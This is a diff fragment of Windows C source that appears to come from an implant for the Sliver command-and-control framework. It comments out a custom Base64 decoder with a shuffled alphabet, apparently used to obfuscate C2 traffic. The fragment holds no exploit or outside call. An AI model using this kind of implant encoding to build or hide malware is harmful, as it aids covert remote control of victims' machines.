@@ -295,30 +295,30 @@ PENVELOPE CreateErrorRespEnvelope
 	return pResult;
 }
 
-PBUFFER SliverBase64Decode
-(
-	_In_ LPSTR lpInput
-)
-{
-	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
-	LPSTR lpTemp = NULL;
-	DWORD cbInput = lstrlenA(lpInput);
-	DWORD i = 0;
-	lpTemp = ALLOC(cbInput + 1);
-	DWORD dwPos = 0;
-	PBUFFER pResult = NULL;
-
-	for (i = 0; i < cbInput; i++) {
-		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
-		lpTemp[i] = szOldCharSet[dwPos];
-	}
-
-	pResult = ALLOC(sizeof(BUFFER));
-	pResult->pBuffer = Base64Decode(lpTemp, &pResult->cbBuffer);
-	FREE(lpTemp);
-	return pResult;
-}
+//PBUFFER SliverBase64Decode
+//(
+//	_In_ LPSTR lpInput
+//)
+//{
+//	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+//	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
+//	LPSTR lpTemp = NULL;
+//	DWORD cbInput = lstrlenA(lpInput);
+//	DWORD i = 0;
+//	lpTemp = ALLOC(cbInput + 1);
+//	DWORD dwPos = 0;
+//	PBUFFER pResult = NULL;
+//
+//	for (i = 0; i < cbInput; i++) {
+//		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
+//		lpTemp[i] = szOldCharSet[dwPos];
+//	}
+//
+//	pResult = ALLOC(sizeof(BUFFER));
+//	pResult->pBuffer = Base64Decode(lpTemp, &pResult->cbBuffer);
+//	FREE(lpTemp);
+//	return pResult;
+//}
 
 PBUFFER SliverEncrypt
 (
